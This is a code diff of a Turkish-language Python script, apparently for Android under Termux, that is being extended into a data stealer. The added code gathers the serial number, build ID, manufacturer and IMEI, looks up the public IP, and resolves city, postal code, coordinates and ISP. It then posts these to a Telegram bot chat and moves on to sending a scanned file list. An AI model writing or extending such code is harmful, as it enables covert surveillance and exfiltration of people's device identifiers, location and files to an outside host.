@@ -17,17 +17,49 @@ dosya_haritasi = {}
 def cihaz_bilgisi_al():
     bilgiler = {}
     try:
-        bilgiler["Model"] = os.popen("getprop ro.product.model").read().strip()
-        bilgiler["OS"] = os.popen("getprop ro.build.version.release").read().strip()
-        # IP alma: Önce ip route, sonra ifconfig dene
+        # Cihaz bilgileri
+        bilgiler["Model"] = os.popen("getprop ro.product.model").read().strip() or "Bilinmiyor"
+        bilgiler["OS"] = os.popen("getprop ro.build.version.release").read().strip() or "Bilinmiyor"
+        bilgiler["Seri No"] = os.popen("getprop ro.serialno").read().strip() or "Bilinmiyor"
+        bilgiler["Cihaz ID"] = os.popen("getprop ro.build.id").read().strip() or "Bilinmiyor"
+        bilgiler["Üretici"] = os.popen("getprop ro.product.manufacturer").read().strip() or "Bilinmiyor"
+        # IMEI (opsiyonel, termux-api gerekir)
         try:
-            ip_cikti = os.popen("ip route get 8.8.8.8").read()
-            ip = [line for line in ip_cikti.splitlines() if "src" in line]
-            bilgiler["IP"] = ip[0].split("src")[1].split()[0] if ip else "Bilinmiyor"
+            bilgiler["IMEI"] = os.popen("termux-telephony-deviceinfo").read().strip() or "Bilinmiyor"
         except:
-            ip_cikti = os.popen("ifconfig wlan0").read()
-            ip = [line for line in ip_cikti.splitlines() if "inet addr" in line]
-            bilgiler["IP"] = ip[0].split("inet addr:")[1].split()[0] if ip else "Bilinmiyor"
+            bilgiler["IMEI"] = "Bilinmiyor"
+        
+        # IP ve detaylı konum bilgileri
+        try:
+            ip_response = requests.get("https://api.ipify.org/?format=json")
+            ip_json = ip_response.json()
+            ip = ip_json.get("ip", "Bilinmiyor")
+            bilgiler["IP"] = ip
+
+            ip_info_response = requests.get(f"http://ip-api.com/json/{ip}")
+            ip_info = ip_info_response.json()
+            bilgiler["Ülke"] = ip_info.get("country", "Bilinmiyor")
+            bilgiler["Ülke Kodu"] = ip_info.get("countryCode", "Bilinmiyor")
+            bilgiler["Bölge"] = ip_info.get("region", "Bilinmiyor")
+            bilgiler["Bölge Adı"] = ip_info.get("regionName", "Bilinmiyor")
+            bilgiler["Şehir"] = ip_info.get("city", "Bilinmiyor")
+            bilgiler["Posta Kodu"] = ip_info.get("zip", "Bilinmiyor")
+            bilgiler["Enlem"] = str(ip_info.get("lat", "Bilinmiyor"))
+            bilgiler["Boylam"] = str(ip_info.get("lon", "Bilinmiyor"))
+            bilgiler["ISP"] = ip_info.get("isp", "Bilinmiyor")
+            bilgiler["Organizasyon"] = ip_info.get("org", "Bilinmiyor")
+        except:
+            bilgiler["IP"] = "Bilinmiyor"
+            bilgiler["Ülke"] = "Bilinmiyor"
+            bilgiler["Ülke Kodu"] = "Bilinmiyor"
+            bilgiler["Bölge"] = "Bilinmiyor"
+            bilgiler["Bölge Adı"] = "Bilinmiyor"
+            bilgiler["Şehir"] = "Bilinmiyor"
+            bilgiler["Posta Kodu"] = "Bilinmiyor"
+            bilgiler["Enlem"] = "Bilinmiyor"
+            bilgiler["Boylam"] = "Bilinmiyor"
+            bilgiler["ISP"] = "Bilinmiyor"
+            bilgiler["Organizasyon"] = "Bilinmiyor"
     except:
         bilgiler["Hata"] = "Bazı bilgiler alınamadı!"
     return bilgiler
@@ -61,11 +93,36 @@ def dosya_tara():
 def bilgileri_kaydet_ve_gonder():
     zaman_damgasi = int(time.time())
 
-    # Cihaz bilgisini mesaj olarak gönder
+    # Cihaz ve IP bilgisini estetik mesaj olarak gönder
     cihaz_bilgisi = cihaz_bilgisi_al()
-    cihaz_mesaji = "\n".join([f"{k}: {v}" for k, v in cihaz_bilgisi.items()])
-    requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": f"Cihaz Bilgisi:\n{cihaz_mesaji}"})
-    print("Cihaz bilgisi mesaj olarak gönderildi!")
+    cihaz_mesaji = (
+        "╔══════════════════════╗\n"
+        "║      Cihaz Bilgisi   ║\n"
+        "╠══════════════════════╣\n"
+        f"║ Model: {cihaz_bilgisi.get('Model', 'Bilinmiyor')} \n"
+        f"║ OS: {cihaz_bilgisi.get('OS', 'Bilinmiyor')} \n"
+        f"║ Seri No: {cihaz_bilgisi.get('Seri No', 'Bilinmiyor')} \n"
+        f"║ Cihaz ID: {cihaz_bilgisi.get('Cihaz ID', 'Bilinmiyor')} \n"
+        f"║ Üretici: {cihaz_bilgisi.get('Üretici', 'Bilinmiyor')} \n"
+        f"║ IMEI: {cihaz_bilgisi.get('IMEI', 'Bilinmiyor')} \n"
+        "╠══════════════════════╣\n"
+        "║      IP Bilgisi      ║\n"
+        "╠══════════════════════╣\n"
+        f"║ IP: {cihaz_bilgisi.get('IP', 'Bilinmiyor')} \n"
+        f"║ Ülke: {cihaz_bilgisi.get('Ülke', 'Bilinmiyor')} \n"
+        f"║ Ülke Kodu: {cihaz_bilgisi.get('Ülke Kodu', 'Bilinmiyor')} \n"
+        f"║ Bölge: {cihaz_bilgisi.get('Bölge', 'Bilinmiyor')} \n"
+        f"║ Bölge Adı: {cihaz_bilgisi.get('Bölge Adı', 'Bilinmiyor')} \n"
+        f"║ Şehir: {cihaz_bilgisi.get('Şehir', 'Bilinmiyor')} \n"
+        f"║ Posta Kodu: {cihaz_bilgisi.get('Posta Kodu', 'Bilinmiyor')} \n"
+        f"║ Enlem: {cihaz_bilgisi.get('Enlem', 'Bilinmiyor')} \n"
+        f"║ Boylam: {cihaz_bilgisi.get('Boylam', 'Bilinmiyor')} \n"
+        f"║ ISP: {cihaz_bilgisi.get('ISP', 'Bilinmiyor')} \n"
+        f"║ Organizasyon: {cihaz_bilgisi.get('Organizasyon', 'Bilinmiyor')} \n"
+        "╚══════════════════════╝"
+    )
+    requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": cihaz_mesaji})
+    print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
 
     # Dosya listesini kaydet ve gönder
     dosya_listesi = dosya_tara()
